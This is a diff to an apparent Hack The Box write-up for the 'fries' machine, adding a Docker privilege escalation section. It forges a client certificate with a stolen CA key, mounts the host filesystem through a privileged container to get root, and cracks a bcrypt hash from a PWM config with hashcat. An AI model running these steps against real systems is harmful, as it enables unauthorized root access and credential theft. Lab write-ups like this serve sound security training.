@@ -324,10 +324,11 @@ svc@fries.htb's password:
 Last login: Wed Nov 19 20:53:19 2025 from 10.10.14.77
 svc@web:~$ 
 ```
-### Docker Priv
+### Docker Privilege Escalation
 
-the port exposed 2375
-Exposing your Docker daemon socket over an unauthenticated TCP port is one of the most critical security misconfigurations you can make. It is not merely a vulnerability; it is a direct, unauthenticated gateway to a root shell on your host machine. This means that anyone who can find that open port on the internet can gain complete control over your server, its data, and any services it [runs](https://medium.com/@instatunnel/docker-socket-security-a-critical-vulnerability-guide-76f4137a68c5).
+Although the Docker daemon was not exposed publicly over an unauthenticated TCP port (2375), it was accessible locally on `127.0.0.1:2376` with TLS authentication enabled. Under normal circumstances, this configuration is secure and requires a valid client certificate signed by a trusted Certificate Authority (CA).
+
+However, due to the NFS misconfiguration, the Root CA private key (`ca-key.pem`) was accessible. This allowed us to forge a trusted client certificate and authenticate directly to the Docker daemon. Since Docker runs as root, gaining API access effectively resulted in full root-level control of the host. [Read more.](https://medium.com/@instatunnel/docker-socket-security-a-critical-vulnerability-guide-76f4137a68c5).
 
 ```sh
 svc@web:~$ ss -ntlp
@@ -346,20 +347,152 @@ LISTEN     0          4096               127.0.0.1:3000               0.0.0.0:*
 LISTEN     0          4096                 0.0.0.0:44501              0.0.0.0:*  
 ```
 
+###  Forging a Trusted Docker Client Certificate
+Since we obtained the Root CA private key from the NFS share, we can generate our own trusted client certificate.
+```sh
+# Generate a new private key
+openssl genrsa -out client.key 4096
+
+# Create a CSR with CN=root
+openssl req -new \
+  -key client.key \
+  -out client.csr \
+  -subj "/CN=root"
+
+# Sign the CSR using the compromised CA
+openssl x509 -req \
+  -in client.csr \
+  -CA ca.pem \
+  -CAkey ca-key.pem \
+  -CAcreateserial \
+  -out client.pem \
+  -days 365 -sha256
+```
+
+```sh
+➜  cert ls
+ca.pem  client.csr  client.key  client.pem  client.pfx
+```
+now transfer those in the in fries.htb
+```sh
+svc@web:/tmp/certs$ ls
+ca.pem  cert.pem  client.pfx  key.pem
+```
+
 ```sh
 export DOCKER_HOST=tcp://127.0.0.1:2376
 export DOCKER_TLS_VERIFY=1
 export DOCKER_CERT_PATH=/tmp/cert
 ```
 
+```sh
+svc@web:/tmp/certs$ docker ps
+CONTAINER ID   IMAGE                   COMMAND                  CREATED        STATUS             PORTS                                                                        NAMES
+f427ecaa3bdd   pwm/pwm-webapp:latest   "/app/startup.sh"        8 months ago   Up About an hour   0.0.0.0:8443->8443/tcp, [::]:8443->8443/tcp                                  pwm
+cb46692a4590   dpage/pgadmin4:9.1.0    "/entrypoint.sh"         8 months ago   Up About an hour   443/tcp, 127.0.0.1:5050->80/tcp                                              pgadmin4
+bfe752a26695   fries-web               "/usr/local/bin/pyth…"   8 months ago   Up About an hour   127.0.0.1:5000->5000/tcp                                                     web
+858fdf51af59   postgres:16             "docker-entrypoint.s…"   8 months ago   Up About an hour   5432/tcp                                                                     postgres
+b916aad508e2   gitea/gitea:1.22.6      "/usr/bin/entrypoint…"   8 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 172.18.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+```
+
+```sh
+ docker run -it --rm   --privileged   --entrypoint /bin/sh   -v /:/mnt   pwm/pwm-webapp
+# 
+# chroot /mnt /bin/sh
+```
+
+```sh
+# cd root
+# ls	
+scripts  snap  user.txt
+# cd scripts
+# ls
+clear-containers.sh  docker-compose.yml  pwm               start-web-svc.sh  web
+clear-share.sh       gitea               restore-certs.sh  stop-web-svc.sh
+# cd pwm
+# ls
+config  pwm-workpath
+# cd config
+# ls
+applicationPath.lock  backup  LocalDB  logs  PwmConfiguration.xml  temp
+```
 
 
+```sh
+# cat PwmConfiguration.xml
+<?xml version="1.0" encoding="UTF-8"?><PwmConfiguration createTime="2025-06-01T02:07:43Z" modifyTime="2025-06-01T19:53:04Z" pwmBuild="b7ed22b" pwmVersion="2.0.8" xmlVersion="5">
+    <properties type="config">
+        <property key="configIsEditable">true</property>
+        <property key="configEpoch">0</property>
+        <property key="configPasswordHash">$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG</property>
+    </properties>
+```
 
+```sh
+➜  hashcat hashcat -m 3200 shashs.txt rockyou.txt 
+hashcat (v6.2.5) starting
 
+Successfully initialized NVIDIA CUDA library.
 
+Failed to initialize NVIDIA RTC library.
 
+* Device #1: CUDA SDK Toolkit not installed or incorrectly installed.
+             CUDA SDK Toolkit required for proper device support and utilization.
+             Falling back to OpenCL runtime.
 
+* Device #1: WARNING! Kernel exec timeout is not disabled.
+             This may cause "CL_OUT_OF_RESOURCES" or related errors.
+             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
+nvmlDeviceGetFanSpeed(): Not Supported
 
+OpenCL API (OpenCL 3.0 CUDA 13.0.84) - Platform #1 [NVIDIA Corporation]
+=======================================================================
+* Device #1: NVIDIA GeForce RTX 3050 A Laptop GPU, 2944/3727 MB (931 MB allocatable), 14MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache built:
+* Filename..: rockyou.txt
+* Passwords.: 14344393
+* Bytes.....: 139921524
+* Keyspace..: 14344386
+* Runtime...: 0 secs
+
+$2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0NgA6ZexGyG:rockon!
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$04$W1TubX/9JAqpHlxx7xqXpesUMB2bJMV4dH/8pXbcul0N...ZexGyG
+Time.Started.....: Sun Feb  1 22:29:24 2026 (1 sec)
+Time.Estimated...: Sun Feb  1 22:29:25 2026 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    23799 H/s (6.80ms) @ Accel:16 Loops:16 Thr:11 Vec:1
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 22352/14344386 (0.16%)
+Rejected.........: 0/22352 (0.00%)
+Restore.Point....: 22176/14344386 (0.15%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-16
+Candidate.Engine.: Device Generator
+Candidates.#1....: 061091 -> gisele
+Hardware.Mon.#1..: Temp: 49c Util: 97% Core:2520MHz Mem:8001MHz Bus:8
+```
 ### Port 443
 
 ![Image description](assets/images/fries/friesport443.png)
